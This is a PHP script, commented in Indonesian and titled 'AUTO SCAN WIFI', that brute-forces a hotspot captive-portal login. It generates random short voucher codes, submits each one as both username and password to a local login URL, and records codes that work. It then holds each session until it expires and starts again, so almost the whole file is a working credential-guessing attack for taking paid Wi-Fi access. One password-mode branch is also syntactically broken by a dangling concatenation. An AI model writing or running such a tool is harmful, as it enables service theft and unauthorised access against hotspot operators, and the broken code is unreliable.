<?php
system('clear');

$green = "\033[32m";
$red = "\033[31m";
$yellow = "\033[33m";
$reset = "\033[0m";
$banner = "{$green}
   ___        __        ____                         
  / _ | ___  / /__ ___ / __/__  __ _____  ___  ___ _
 / __ |/ _ \/ / -_|_-</ _// _ \/ // / _ \/ _ \/ _ `/
/_/ |_/_//_/_/\__/___/_/  \___/\_,_/_//_/_//_/\_,_/ 
                   AUTO SCAN WIFI
$reset\n";

echo $banner;

$login_url = "http://192.168.200.1/login";
$status_url = "http://192.168.200.1/status";
$logout_url = "http://wifi.net/logout";
$password_file = "passwords.txt";

$headers = [
    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
    "Content-Type: application/x-www-form-urlencoded"
];

function get($url, $headers = []) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function post($url, $data, $headers = []) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function open_in_chrome($url) {
    // Menggunakan xdg-open untuk membuka URL di browser default, seperti Chrome
    system("xdg-open $url");
}

function parse_status($html) {
    $info = [];
    preg_match('/<h3 id="user">(\d+)<\/h3>/', $html, $m); $info['User ID'] = $m[1] ?? 'N/A';
    preg_match('/IP Address.*?<td>(.*?)<\/td>/', $html, $m); $info['IP'] = $m[1] ?? 'N/A';
    preg_match('/MAC Address.*?<td>(.*?)<\/td>/', $html, $m); $info['MAC'] = $m[1] ?? 'N/A';
    preg_match('/Upload.*?<td>(.*?)<\/td>/', $html, $m); $info['Upload'] = $m[1] ?? 'N/A';
    preg_match('/Download.*?<td>(.*?)<\/td>/', $html, $m); $info['Download'] = $m[1] ?? 'N/A';
    preg_match('/Terkoneksi.*?<td>(.*?)<\/td>/', $html, $m); $info['Connected'] = $m[1] ?? 'N/A';
    preg_match('/Sisa Waktu.*?<td>(.*?)<\/td>/', $html, $m); $info['Remaining'] = $m[1] ?? 'N/A';
    return $info;
}

function parse_remaining_to_seconds($str) {
    if (!preg_match('/(\d+)h(\d+)m(\d+)s/', $str, $m)) return 7200;
    return ($m[1] * 3600) + ($m[2] * 60) + $m[3];
}

function print_status($info) {
    global $green, $reset;
    echo "{$green}\nStatus Koneksi Saat Ini:\n";
    foreach ($info as $key => $value) {
        echo "$key: $value\n";
    }
    echo $reset;
}

function generate_passwords($mode = '3L2N', $count = 10) {
    $letters = str_split("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
    $lett = str_split("rwxmnops");
    $numbers = str_split("435678");
    $passwords = [];

    while (count($passwords) < $count) {
        if ($mode == '5N') {
            $p = implode('', array_map(fn() => $numbers[array_rand($numbers)], range(1,5)));
        } elseif ($mode == '6N') {
            $p = implode('', array_map(fn() => $numbers[array_rand($numbers)], range(1,6)));
        } elseif ($mode == '3L2N') {
            $p = implode('', array_map(fn() => $letters[array_rand($letters)], range(1,3))) .
            } elseif ($mode == '2L2N') {
            $p = implode('', array_map(fn() => $letters[array_rand($letters)], range(1,2))) .
                 implode('', array_map(fn() => $numbers[array_rand($numbers)], range(1,2)));
        } elseif ($mode == '3L3N') {
            $p = implode('', array_map(fn() => $letters[array_rand($letters)], range(1,3))) .
                 implode('', array_map(fn() => $numbers[array_rand($numbers)], range(1,3)));
        } elseif ($mode == '5L') {
            $p = implode('', array_map(fn() => $lett[array_rand($lett)], range(1,5)));
       } elseif ($mode == '4L') {
            $p = implode('', array_map(fn() => $lett[array_rand($lett)], range(1,4)));
            }elseif ($mode == '4L3N') {
            	$p = implode('', array_map(fn() => $letters[array_rand($letters)], range(1,4))) .
                 implode('', array_map(fn() => $numbers[array_rand($numbers)], range(1,3)));

        } else {
            continue;
        }
        if (!in_array($p, $passwords)) $passwords[] = $p;
    }
    file_put_contents("passwords.txt", implode(PHP_EOL, $passwords));
}

// Pemilihan format password
echo "{$yellow}Pilih format password yang akan di-generate:\n";
echo "1. 5 angka saja (5N)\n2. 6 angka saja (6N)\n3. 3 huruf + 2 angka (3L2N)\n4. 3 huruf + 3 angka (3L3N)\n5. 5 huruf saja (5L)\n6. 4 Huruf\n7. 4 Huruf 3 Angka (4L3N)\n8. 2 Huruf 2 Angka\nPilihan [1-8]: {$reset}";
$choice = trim(fgets(STDIN));
$modes = ['1' => '5N', '2' => '6N', '3' => '3L2N', '4' => '3L3N', '5' => '5L', '6' => '4L','7'=>'4L3N','8'=>'2L2N'];
$selected_mode = $modes[$choice] ?? '6N';
echo "{$red}Menghasilkan password dengan mode...{$yellow}$selected_mode{$reset}\n";

// Buat password kalau belum ada
if (!file_exists($password_file)) {
    echo "{$yellow}Membuat file password dengan format: $selected_mode{$reset}\n";
    generate_passwords($selected_mode);
}

function login_and_monitor($selected_mode) {
    global $login_url, $status_url, $logout_url, $headers, $password_file, $yellow, $green, $red, $reset;

    $passwords = file($password_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($passwords as $pwd) {
        $data = "username=$pwd&password=$pwd&dst=&popup=true";
        $res = post($login_url, $data, $headers);
        $status = get($status_url, $headers);
        preg_match('/<div class="notice">(.*?)<\/div>/', $res, $match);
        $notice = $match[1] ?? '';
        
        echo "{$yellow}Mencoba login dengan {$green}$pwd{$reset}";
        echo "\r[$pwd]-{$red}$notice{$reset}\n";

        if (strpos($status, "Logout") !== false) {
            echo "{$green}Login berhasil dengan: $pwd{$reset}\n";
            file_put_contents("log_success.txt", "$pwd\n", FILE_APPEND);

            $status_html = get($status_url, $headers);
            $status = parse_status($status_html);
            print_status($status);

            // Buka halaman status di Chrome
            open_in_chrome($status_url);

            $wait = parse_remaining_to_seconds($status['Remaining'] ?? '');
            sleep($wait);

            get($logout_url, $headers);
            echo "{$red}Logged out. Melanjutkan scan password...{$reset}\n";
            return login_and_monitor($selected_mode);
        }
    }

    system('clear');
    echo $GLOBALS['banner'];
    echo "{$red}Semua password gagal. Menghasilkan ulang...{$yellow}$selected_mode{$reset}\n";
    unlink($password_file);
    generate_passwords($selected_mode);
    login_and_monitor($selected_mode);
}

// Cek status sebelum login
$status_page = get($status_url, $headers);
if (strpos($status_page, "Logout") !== false) {
    echo "{$green}[INFO] Sudah login!{$reset}\n";
    $status = parse_status($status_page);
    print_status($status);

    // Buka halaman status di Chrome
    open_in_chrome($status_url);

    $wait = parse_remaining_to_seconds($status['Remaining'] ?? '');
    sleep($wait);
    get($logout_url, $headers);
    echo "{$red}Logged out. Melanjutkan scan password...{$reset}\n";
}

login_and_monitor($selected_mode);
?>
